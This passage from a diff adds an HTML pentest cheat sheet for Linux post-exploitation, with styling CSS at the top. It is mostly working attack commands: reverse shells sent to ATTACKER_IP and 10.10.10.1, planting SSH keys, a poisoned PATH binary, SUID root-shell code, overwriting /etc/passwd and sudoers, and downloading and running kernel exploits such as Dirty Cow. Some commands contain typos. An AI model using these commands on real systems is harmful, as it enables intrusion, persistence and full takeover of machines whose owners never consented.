+    color: #f8bb86; }
+  .swal2-icon.swal2-info {
+    border-color: #9de0f6;
+    color: #3fc3ee; }
+  .swal2-icon.swal2-question {
+    border-color: #c9dae1;
+    color: #87adbd; }
+  .swal2-icon.swal2-success {
+    border-color: #a5dc86; }
+    .swal2-icon.swal2-success [class^='swal2-success-circular-line'] {
+      position: absolute;
+      width: 3.75em;
+      height: 7.5em;
+      -webkit-transform: rotate(45deg);
+              transform: rotate(45deg);
+      border-radius: 50%; }
+      .swal2-icon.swal2-success [class^='swal2-success-circular-line'][class$='left'] {
+        top: -.4375em;
+        left: -2.0635em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg);
+        -webkit-transform-origin: 3.75em 3.75em;
+                transform-origin: 3.75em 3.75em;
+        border-radius: 7.5em 0 0 7.5em; }
+      .swal2-icon.swal2-success [class^='swal2-success-circular-line'][class$='right'] {
+        top: -.6875em;
+        left: 1.875em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg);
+        -webkit-transform-origin: 0 3.75em;
+                transform-origin: 0 3.75em;
+        border-radius: 0 7.5em 7.5em 0; }
+    .swal2-icon.swal2-success .swal2-success-ring {
+      position: absolute;
+      top: -.25em;
+      left: -.25em;
+      width: 100%;
+      height: 100%;
+      border: 0.25em solid rgba(165, 220, 134, 0.3);
+      border-radius: 50%;
+      z-index: 2;
+      box-sizing: content-box; }
+    .swal2-icon.swal2-success .swal2-success-fix {
+      position: absolute;
+      top: .5em;
+      left: 1.625em;
+      width: .4375em;
+      height: 5.625em;
+      -webkit-transform: rotate(-45deg);
+              transform: rotate(-45deg);
+      z-index: 1; }
+    .swal2-icon.swal2-success [class^='swal2-success-line'] {
+      display: block;
+      position: absolute;
+      height: .3125em;
+      border-radius: .125em;
+      background-color: #a5dc86;
+      z-index: 2; }
+      .swal2-icon.swal2-success [class^='swal2-success-line'][class$='tip'] {
+        top: 2.875em;
+        left: .875em;
+        width: 1.5625em;
+        -webkit-transform: rotate(45deg);
+                transform: rotate(45deg); }
+      .swal2-icon.swal2-success [class^='swal2-success-line'][class$='long'] {
+        top: 2.375em;
+        right: .5em;
+        width: 2.9375em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg); }
+
+.swal2-progresssteps {
+  align-items: center;
+  margin: 0 0 1.25em;
+  padding: 0;
+  font-weight: 600; }
+  .swal2-progresssteps li {
+    display: inline-block;
+    position: relative; }
+  .swal2-progresssteps .swal2-progresscircle {
+    width: 2em;
+    height: 2em;
+    border-radius: 2em;
+    background: #3085d6;
+    color: #fff;
+    line-height: 2em;
+    text-align: center;
+    z-index: 20; }
+    .swal2-progresssteps .swal2-progresscircle:first-child {
+      margin-left: 0; }
+    .swal2-progresssteps .swal2-progresscircle:last-child {
+      margin-right: 0; }
+    .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep {
+      background: #3085d6; }
+      .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal2-progresscircle {
+        background: #add8e6; }
+      .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal2-progressline {
+        background: #add8e6; }
+  .swal2-progresssteps .swal2-progressline {
+    width: 2.5em;
+    height: .4em;
+    margin: 0 -1px;
+    background: #3085d6;
+    z-index: 10; }
+
+[class^='swal2'] {
+  -webkit-tap-highlight-color: transparent; }
+
+.swal2-show {
+  -webkit-animation: swal2-show 0.3s;
+          animation: swal2-show 0.3s; }
+  .swal2-show.swal2-noanimation {
+    -webkit-animation: none;
+            animation: none; }
+
+.swal2-hide {
+  -webkit-animation: swal2-hide 0.15s forwards;
+          animation: swal2-hide 0.15s forwards; }
+  .swal2-hide.swal2-noanimation {
+    -webkit-animation: none;
+            animation: none; }
+
+[dir='rtl'] .swal2-close {
+  right: auto;
+  left: 0; }
+
+.swal2-animate-success-icon .swal2-success-line-tip {
+  -webkit-animation: swal2-animate-success-line-tip 0.75s;
+          animation: swal2-animate-success-line-tip 0.75s; }
+
+.swal2-animate-success-icon .swal2-success-line-long {
+  -webkit-animation: swal2-animate-success-line-long 0.75s;
+          animation: swal2-animate-success-line-long 0.75s; }
+
+.swal2-animate-success-icon .swal2-success-circular-line-right {
+  -webkit-animation: swal2-rotate-success-circular-line 4.25s ease-in;
+          animation: swal2-rotate-success-circular-line 4.25s ease-in; }
+
+.swal2-animate-error-icon {
+  -webkit-animation: swal2-animate-error-icon 0.5s;
+          animation: swal2-animate-error-icon 0.5s; }
+  .swal2-animate-error-icon .swal2-x-mark {
+    -webkit-animation: swal2-animate-error-x-mark 0.5s;
+            animation: swal2-animate-error-x-mark 0.5s; }
+
+@-webkit-keyframes swal2-rotate-loading {
+  0% {
+    -webkit-transform: rotate(0deg);
+            transform: rotate(0deg); }
+  100% {
+    -webkit-transform: rotate(360deg);
+            transform: rotate(360deg); } }
+
+@keyframes swal2-rotate-loading {
+  0% {
+    -webkit-transform: rotate(0deg);
+            transform: rotate(0deg); }
+  100% {
+    -webkit-transform: rotate(360deg);
+            transform: rotate(360deg); } }</style></head>
+    <body>
+        <fieldset class="box">
+            <legend>Post exploitation</legend>
+                <p>Get a TTY shell after a reverse shell connection</p>
+                <pre><code>$&nbsp;python&nbsp;-c&nbsp;<span class="green">'import pty;pty.spawn("</span>/bin/bash<span class="green">")'</span></code></pre>
+                <p>Set PATH TERM and SHELL if missing:</p>
+                <pre><code>$&nbsp;<span class="red">export</span>&nbsp;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export&nbsp;TERM=xterm
+export&nbsp;SHELL=bash</code></pre>
+                <p>Add public key to authorized keys:</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">$</span>(<span class="red">wget</span>&nbsp;<span class="blue">https://ATTACKER_IP/.ssh/id_rsa.pub)</span>&nbsp;&gt;&gt;&nbsp;~/.ssh/authotized_keys</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Escaping limited interpreters</legend>
+                <p>Some payloads to overcome limited shells:</p>
+                <pre><code>$&nbsp;<span class="red">ssh</span>&nbsp;user@$ip&nbsp;nc&nbsp;$localip&nbsp;4444&nbsp;-e&nbsp;/bin/sh
+&nbsp;&nbsp;&nbsp;&nbsp;enter&nbsp;user<span class="green">'s password
+$ python -c '</span><span class="blue">import</span>&nbsp;pty;&nbsp;<span class="green">pty.spawn</span>(<span class="green">"/bin/sh"</span>)'
+$ export TERM=linux</code></pre>
+                <pre><code>$&nbsp;python&nbsp;-c&nbsp;<span class="green">'import pty; pty.spawn("</span>/bin/sh<span class="green">")'</span></code></pre>
+                <pre><code>$&nbsp;python&nbsp;-c&nbsp;<span class="green">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("</span>$ip<span class="green">",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["</span>/bin/sh<span class="green">","</span>-i<span class="green">"]);'</span></code></pre>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">os.system</span>(<span class="green">'/bin/bash'</span>)</code></pre>
+                <pre><code>$&nbsp;/bin/sh&nbsp;-i</code></pre>
+                <pre><code>$&nbsp;<span class="red">exec</span>&nbsp;<span class="green">"/bin/sh"</span>;</code></pre>
+                <pre><code>$&nbsp;perl&nbsp;—e&nbsp;<span class="green">'exec "</span>/bin/sh<span class="green">";'</span></code></pre>
+                <p>From within tcpdump</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;$’id\n/bin/netcat&nbsp;$ip&nbsp;443&nbsp;-e&nbsp;/bin/bash’&nbsp;&gt;&nbsp;/tmp/.test
+chmod&nbsp;+x&nbsp;/tmp/.test
+sudo&nbsp;tcpdump&nbsp;-ln&nbsp;-I&nbsp;eth-&nbsp;-w&nbsp;/dev/null&nbsp;-W&nbsp;1&nbsp;-G&nbsp;1&nbsp;-z&nbsp;/tmp/.tst&nbsp;-Z&nbsp;root</code></pre>
+                <p>From busybox</p>
+                <pre><code>$&nbsp;/bin/busybox&nbsp;telnetd&nbsp;-|/bin/sh&nbsp;-p9999</code></pre>
+                <pre><code>:!bash
+:set&nbsp;shell=/bin/bash:shell
+!bash
+find&nbsp;/&nbsp;-exec&nbsp;/usr/bin/awk&nbsp;<span class="green">'BEGIN {system("</span>/bin/bash<span class="green">")}'</span>&nbsp;;
+awk&nbsp;<span class="green">'BEGIN {system("</span>/bin/bash<span class="green">")}'</span>
+--interactive
+echo&nbsp;<span class="green">"os.execute('</span>/bin/sh<span class="green">')"</span>
+sudo&nbsp;nmap&nbsp;--script=exploit.nse
+perl&nbsp;-e&nbsp;<span class="green">'exec "</span>/bin/bash<span class="green">";'</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Linux elevation of privileges, manual testing</legend>
+                <p>Things to look: Miss-configured services (cronjobs), incorrect file permissions (exportfs, sudo), miss-configured environment ($PATH), binary with SUID bit, software or OS with known vulnerabilities.</p>
+                <p>First try simple sudo:</p>
+                <pre><code>$&nbsp;<span class="red">sudo</span>&nbsp;<span class="red">su</span>&nbsp;-</code></pre>
+                <p>What can we run with sudo?</p>
+                <pre><code>$&nbsp;<span class="red">sudo</span>&nbsp;-l</code></pre>
+                <p>Try su as all users and the username as password</p>
+                <p>What services are running as root?:</p>
+                <pre><code>$&nbsp;<span class="red">ps</span>&nbsp;aux&nbsp;|&nbsp;<span class="red">grep</span>&nbsp;root</code></pre>
+                <p>Look for vulnerable/privileged components such as: mysql, sudo, udev, python</p>
+                <p>If <strong>/etc/exports</strong> if writable, you can add an NFS entry or change and existing entry adding the <strong>no_root_squash</strong> flag to a root directory, put a binary with SUID bit on, and get root.</p>
+                <p>If there is a <strong>cronjob</strong> that runs as run but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.</p>
+                <p>The following command will list processes running by root, permissions and NFS exports.</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'services running as root'</span>;&nbsp;<span class="red">ps</span>&nbsp;aux&nbsp;|&nbsp;<span class="red">grep</span>&nbsp;root;&nbsp;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'permissions'</span>;&nbsp;<span class="red">ps</span>&nbsp;aux&nbsp;|&nbsp;<span class="red">awk</span>&nbsp;<span class="green">'{print $11}'</span>|xargs&nbsp;-r&nbsp;<span class="red">ls</span>&nbsp;-la&nbsp;2&gt;/dev/null&nbsp;|awk&nbsp;<span class="green">'!x[$0]++'</span>;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'nfs info'</span>;&nbsp;<span class="red">ls</span>&nbsp;-la&nbsp;/etc/exports&nbsp;2&gt;/dev/null;&nbsp;<span class="red">cat</span>&nbsp;/etc/exports&nbsp;2&gt;/dev/null</code></pre>
+                <p>Use netstat to find other machines connected</p>
+                <pre><code>$&nbsp;<span class="red">netstat</span>&nbsp;-ano</code></pre>
+                <p>Command to skip ignored lines in config files</p>
+                <pre><code>$&nbsp;<span class="red">alias</span>&nbsp;nonempty=<span class="green">"egrep -v '</span>^[&nbsp;\t]*#|^$<span class="green">'"</span></code></pre>
+                <p>If Mysql is running as root, you can run commands using <strong>sys_exec()</strong>. For instance, to add user to sudoers:</p>
+                <pre><code><span class="green">sys_exec</span>(<span class="green">'usermod -a -G admin username'</span>)</code></pre>
+                <p>More about mysql:</p>
+                <pre><code><span class="blue">https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/</span></code></pre>
+                <p>Find linux distribution &amp; version</p>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;/etc/issue;&nbsp;<span class="red">cat</span>&nbsp;/etc/*-release;&nbsp;<span class="red">cat</span>&nbsp;/etc/lsb-release;&nbsp;<span class="red">cat</span>&nbsp;/etc/redhat-release;</code></pre>
+                <p>Architecture</p>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;/proc/version;&nbsp;<span class="red">uname</span>&nbsp;-a;&nbsp;<span class="red">uname</span>&nbsp;-mrs;&nbsp;<span class="red">rpm</span>&nbsp;-q&nbsp;kernel;&nbsp;dmesg&nbsp;|&nbsp;<span class="red">grep</span>&nbsp;Linux;&nbsp;<span class="red">ls</span>&nbsp;/boot&nbsp;|&nbsp;<span class="red">grep</span>&nbsp;vmlinuz-;&nbsp;file&nbsp;/bin/ls;&nbsp;<span class="red">cat</span>&nbsp;/etc/lsb-release</code></pre>
+                <p>Environment variables</p>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;/etc/profile;&nbsp;<span class="red">cat</span>&nbsp;/etc/bashrc;&nbsp;<span class="red">cat</span>&nbsp;~/.bash_profile;&nbsp;<span class="red">cat</span>&nbsp;~/.bashrc;&nbsp;<span class="red">cat</span>&nbsp;~/.bash_logout;&nbsp;env;&nbsp;set</code></pre>
+                <p>Find printers</p>
+                <pre><code>$&nbsp;lpstat&nbsp;-a</code></pre>
+                <p>Find apps installed;</p>
+                <pre><code>$&nbsp;<span class="red">ls</span>&nbsp;-alh&nbsp;/usr/bin/;&nbsp;<span class="red">ls</span>&nbsp;-alh&nbsp;/sbin/;&nbsp;dpkg&nbsp;-l;&nbsp;<span class="red">rpm</span>&nbsp;-qa;&nbsp;<span class="red">ls</span>&nbsp;-alh&nbsp;/var/cache/apt/archivesO;&nbsp;<span class="red">ls</span>&nbsp;-alh&nbsp;/var/cache/yum/*;</code></pre>
+                <p>Find writable configuration files</p>
+                <pre><code>$&nbsp;<span class="red">find</span>&nbsp;/etc/&nbsp;-writable&nbsp;-type&nbsp;f&nbsp;2&gt;/dev/null</code></pre>
+                <p>Miss-configured services</p>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;/etc/syslog.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/chttp.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/lighttpd.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/cups/cupsd.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/inetd.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/apache2/apache2.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/my.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/httpd/conf/httpd.conf;&nbsp;<span class="red">cat</span>&nbsp;/opt/lampp/etc/httpd.conf;&nbsp;<span class="red">ls</span>&nbsp;-aRl&nbsp;/etc/&nbsp;|&nbsp;<span class="red">awk</span>&nbsp;'$1 ~ /^.*r.*/</code></pre>
+                <p>Scheduled jobs</p>
+                <pre><code>$&nbsp;crontab&nbsp;-l;&nbsp;<span class="red">ls</span>&nbsp;-alh&nbsp;/var/spool/cron;&nbsp;<span class="red">ls</span>&nbsp;-al&nbsp;/etc/&nbsp;|&nbsp;<span class="red">grep</span>&nbsp;cron;&nbsp;<span class="red">ls</span>&nbsp;-al&nbsp;/etc/cron*;&nbsp;<span class="red">cat</span>&nbsp;/etc/cron*;&nbsp;<span class="red">cat</span>&nbsp;/etc/at.allow;&nbsp;<span class="red">cat</span>&nbsp;/etc/at.deny;&nbsp;<span class="red">cat</span>&nbsp;/etc/cron.allow;&nbsp;<span class="red">cat</span>&nbsp;/etc/cron.deny</code></pre>
+                <p>Grep hardcoded passwords</p>
+                <pre><code>$&nbsp;<span class="red">grep</span>&nbsp;-i&nbsp;user&nbsp;[filename]
+grep&nbsp;-i&nbsp;<span class="blue">pass</span>&nbsp;[filename]
+grep&nbsp;-C&nbsp;5&nbsp;<span class="green">"password"</span>&nbsp;[filename]
+find&nbsp;.&nbsp;-name&nbsp;<span class="green">"*.php"</span>&nbsp;-print0&nbsp;|&nbsp;xargs&nbsp;-0&nbsp;<span class="red">grep</span>&nbsp;-i&nbsp;-n&nbsp;<span class="green">"var $password"</span></code></pre>
+                <p>if web server run in web root:</p>
+                <pre><code>$&nbsp;<span class="red">grep</span>&nbsp;<span class="green">"localhost"</span>&nbsp;./&nbsp;-R</code></pre>
+                <p>Network configuration</p>
+                <pre><code>$&nbsp;/sbin/ifconfig&nbsp;-a;&nbsp;<span class="red">cat</span>&nbsp;/etc/network/interfaces;&nbsp;<span class="red">cat</span>&nbsp;/etc/sysconfig/network;&nbsp;<span class="red">cat</span>&nbsp;/etc/resolv.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/sysconfig/network;&nbsp;<span class="red">cat</span>&nbsp;/etc/networks;&nbsp;iptables&nbsp;-L;&nbsp;hostname;&nbsp;dnsdomainname</code></pre>
+                <p>List other users home directories</p>
+                <pre><code>$&nbsp;<span class="red">ls</span>&nbsp;-ahlR&nbsp;/root/;&nbsp;<span class="red">ls</span>&nbsp;-ahlR&nbsp;/home/</code></pre>
+                <p>User bash history</p>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;~/.bash_history;&nbsp;<span class="red">cat</span>&nbsp;~/.nano_history;&nbsp;<span class="red">cat</span>&nbsp;~/.atftp_history;&nbsp;<span class="red">cat</span>&nbsp;~/.mysql_history;&nbsp;<span class="red">cat</span>&nbsp;~/.php_history</code></pre>
+                <p>User mails</p>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;~/.bashrc;&nbsp;<span class="red">cat</span>&nbsp;~/.profile;&nbsp;<span class="red">cat</span>&nbsp;/var/mail/root;&nbsp;<span class="red">cat</span>&nbsp;/var/spool/mail/root</code></pre>
+                <p>Find interesting binaries</p>
+                <pre><code>$&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-name&nbsp;wget;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-name&nbsp;nc*;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-name&nbsp;netcat*;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-name&nbsp;tftp*;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-name&nbsp;<span class="red">ftp</span></code></pre>
+                <p>Mounted filesystems</p>
+                <pre><code>$&nbsp;mount;&nbsp;<span class="red">df</span>&nbsp;-h;&nbsp;<span class="red">cat</span>&nbsp;/etc/fstab</code></pre>
+                <p>Look for binaries with the SUID or GUID bits set.</p>
+                <pre><code>$&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-perm&nbsp;-g=s&nbsp;-o&nbsp;-perm&nbsp;-4000&nbsp;!&nbsp;-type&nbsp;l&nbsp;-maxdepth&nbsp;6&nbsp;-exec&nbsp;<span class="red">ls</span>&nbsp;-ld&nbsp;{}&nbsp;\;&nbsp;2&gt;/dev/null
+$&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-perm&nbsp;-1000&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null
+$&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-perm&nbsp;-g=s&nbsp;-type&nbsp;f&nbsp;2&gt;/dev/null</code></pre>
+                <p>Adding a binary to PATH, to hijack another SUID binary invokes it without the fully qualified path.</p>
+                <pre><code>$&nbsp;<span class="blue">function</span>&nbsp;/usr/bin/foo&nbsp;()&nbsp;{&nbsp;/usr/bin/echo&nbsp;<span class="green">"It works"</span>;&nbsp;}
+$&nbsp;<span class="red">export</span>&nbsp;-f&nbsp;/usr/bin/foo
+$&nbsp;/usr/bin/foo
+&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;works</code></pre>
+                <p>if you can just change PATH, the following will add a poisoned ssh binary:</p>
+                <pre><code>&nbsp;set&nbsp;PATH=<span class="green">"/tmp:/usr/local/bin:/usr/bin:/bin"</span>
+&nbsp;<span class="red">echo</span>&nbsp;<span class="green">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.1 4444 &gt;/tmp/f"</span>&nbsp;&gt;&gt;&nbsp;/tmp/ssh
+&nbsp;<span class="red">chmod</span>&nbsp;+x&nbsp;<span class="red">ssh</span></code></pre>
+                <p>Generating SUID C Shell for /bin/bash</p>
+                <pre><code><span class="blue">int</span>&nbsp;<span class="green">main</span>(void){
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">setresuid</span>(0,&nbsp;0,&nbsp;0);
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">system</span>(<span class="green">"/bin/bash"</span>);
+}</code></pre>
+                <p>Without interactive shell</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;-e&nbsp;<span class="green">'#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("</span>/bin/bash<span class="green">");\n}'</span>&nbsp;&gt;&nbsp;setuid.c</code></pre>
+                <p>If you can get root to execute anything, the following will change a binary owner to him and set the SUID flag:</p>
+                <pre><code>$&nbsp;<span class="red">chown</span>&nbsp;root:root&nbsp;/tmp/setuid;chmod&nbsp;4777&nbsp;/tmp/setuid;</code></pre>
+                <p>If /etc/passwd has incorrect permissions, you can root:</p>
+                <pre><code>&nbsp;$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'root::0:0:root:/root:/bin/bash'</span>&nbsp;&gt;&nbsp;/etc/passwd;&nbsp;<span class="red">su</span></code></pre>
+                <p>Add user www-data to sudoers with no password</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'chmod 777 /etc/sudoers &amp;&amp; echo "</span>www-data&nbsp;ALL=NOPASSWD:ALL<span class="green">" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers'</span>&nbsp;&gt;&nbsp;/tmp/update</code></pre>
+                <p>If you can sudo chmod:</p>
+                <pre><code>&nbsp;$echo&nbsp;-e&nbsp;<span class="green">'#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("</span>/bin/bash<span class="green">");\n}'</span>&nbsp;&gt;&nbsp;setuid.c&nbsp;$&nbsp;<span class="red">sudo</span>&nbsp;<span class="red">chown</span>&nbsp;root:root&nbsp;/tmp/setuid;&nbsp;<span class="red">sudo</span>&nbsp;<span class="red">chmod</span>&nbsp;4777&nbsp;/tmp/setuid;&nbsp;/tmp/setuid</code></pre>
+                <p>Wildcard injection if there is a cron with a wildcard in the command line, you can create a file, whose name will be passed as an argument to the cron task, For more info:</p>
+                <pre><code><span class="blue">https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562</span></code></pre>
+                <p>compile exploit fix error</p>
+                <pre><code>$&nbsp;gcc&nbsp;9545.c&nbsp;-o&nbsp;9545&nbsp;-Wl,--hash-style=both</code></pre>
+                <p>Find other uses in the system</p>
+                <pre><code>&nbsp;$id;&nbsp;who;&nbsp;w;&nbsp;last;&nbsp;<span class="red">cat</span>&nbsp;/etc/passwd&nbsp;|&nbsp;cut&nbsp;-d:&nbsp;-f1;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'sudoers:'</span>;&nbsp;<span class="red">cat</span>&nbsp;/etc/sudoers;&nbsp;<span class="red">sudo</span>&nbsp;-l</code></pre>
+                <p>World readable/writable files:</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">"world-writeable folders"</span>;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-writable&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">"world-writeable folders"</span>;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-perm&nbsp;-222&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">"world-writeable folders"</span>;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-perm&nbsp;-o&nbsp;w&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">"world-executable folders"</span>;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-perm&nbsp;-o&nbsp;x&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">"world-writeable &amp; executable folders"</span>;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;<span class="green">\</span>(&nbsp;-perm&nbsp;-o&nbsp;w&nbsp;-perm&nbsp;-o&nbsp;x&nbsp;\)&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null;</code></pre>
+                <p>Find world-readable files:</p>
+                <pre><code>$&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-xdev&nbsp;-type&nbsp;d&nbsp;<span class="green">\</span>(&nbsp;-perm&nbsp;-0002&nbsp;-a&nbsp;!&nbsp;-perm&nbsp;-1000&nbsp;\)&nbsp;-print</code></pre>
+                <p>Find nobody owned files</p>
+                <pre><code>$&nbsp;<span class="red">find</span>&nbsp;/dir&nbsp;-xdev&nbsp;<span class="green">\</span>(&nbsp;-nouser&nbsp;-o&nbsp;-nogroup&nbsp;\)&nbsp;-print</code></pre>
+                <p>Add user to sudoers in python.</p>
+                <pre><code>#!/usr/bin/env&nbsp;python
+import&nbsp;os
+import&nbsp;sys
+try:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">os.system</span>(<span class="green">'echo "</span>username&nbsp;<span class="green">ALL=</span>(ALL:ALL)&nbsp;ALL<span class="green">" &gt;&gt; /etc/sudoers'</span>)
+except:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">sys.exit</span>()</code></pre>
+                <p>Ring0 kernel exploit for 2.3/2.4</p>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c;</span>&nbsp;gcc&nbsp;36038-6.c&nbsp;-m32&nbsp;-o&nbsp;ring0;&nbsp;<span class="red">chmod</span>&nbsp;+x&nbsp;ring0;&nbsp;./ring0</code></pre>
+                <p>Inspect web traffic</p>
+                <pre><code>$&nbsp;tcpdump&nbsp;tcp&nbsp;port&nbsp;80&nbsp;-w&nbsp;output.pcap&nbsp;-i&nbsp;eth0</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Scripts to run</legend>
+                <p>The following script runs exploit suggester and automatically downloads and executes suggested exploits:</p>
+                <pre><code><span class="blue">https://raw.githubusercontent.com/codingo/OSCP-1/master/xploitdeli.py</span></code></pre>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">http://www.securitysift.com/download/linuxprivchecker.py</span></code></pre>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">https://github.com/pentestmonkey/unix-privesc-check</span></code></pre>
+                <p>Other scripts:</p>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py</span></code></pre>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span></code></pre>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</span></code></pre>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl</span></code></pre>
+                <pre><code><span class="red">wget</span>&nbsp;&nbsp;<span class="blue">https://www.rebootuser.com/?p=1758</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Exploits worth running</legend>
+                <p>CVE-2010-3904 - Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p>
+                <pre><code><span class="blue">https://www.exploit-db.com/exploits/15285/</span></code></pre>
+                <p>Linux Kernel &lt;= 2.6.37 'Full-Nelson.c'</p>
+                <p>https://www.exploit-db.com/exploits/15704/</p>
+                <p>CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p>
+                <pre><code><span class="blue">https://git.zx2c4.com/CVE-2012-0056/about/</span></code></pre>
+                <p>Linux CVE 2012-0056</p>
+                <pre><code><span class="red">wget</span>&nbsp;-O&nbsp;exploit.c&nbsp;<span class="blue">&lt;http://www.exploit-db.com/download/18411&gt;
+</span>&nbsp;&nbsp;gcc&nbsp;-o&nbsp;mempodipper&nbsp;exploit.c
+&nbsp;&nbsp;./mempodipper</code></pre>
+                <p>CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p>
+                <pre><code><span class="blue">https://dirtycow.ninja/</span></code></pre>
+                <p>Compile dirty cow:</p>
+                <pre><code>&nbsp;g++&nbsp;-Wall&nbsp;-pedantic&nbsp;-O2&nbsp;-std=c++11&nbsp;-pthread&nbsp;-o&nbsp;dcow&nbsp;40847.cpp&nbsp;-lutil</code></pre>
+                <p>Cross compiling exploits</p>
+                <pre><code>$&nbsp;gcc&nbsp;-m32&nbsp;-o&nbsp;output32&nbsp;hello.c&nbsp;<span class="green">#</span>(32&nbsp;bit)
+$ &nbsp;gcc&nbsp;-m64&nbsp;-o&nbsp;output&nbsp;hello.c&nbsp;#&nbsp;(64&nbsp;bit)</code></pre>
+                <p>Linux 2.6.32</p>
+                <pre><code><span class="blue">https://www.exploit-db.com/exploits/15285/</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Open an xterm remotely</legend>
+                <p>First, run an xserver in your machine</p>
+                <pre><code>$&nbsp;Xnest&nbsp;:1</code></pre>
+                <p>Then, bind it to xterm, again in your machine:</p>
+                <pre><code>$&nbsp;xterm&nbsp;-display&nbsp;<span class="blue">127.0.0.1:1</span></code></pre>
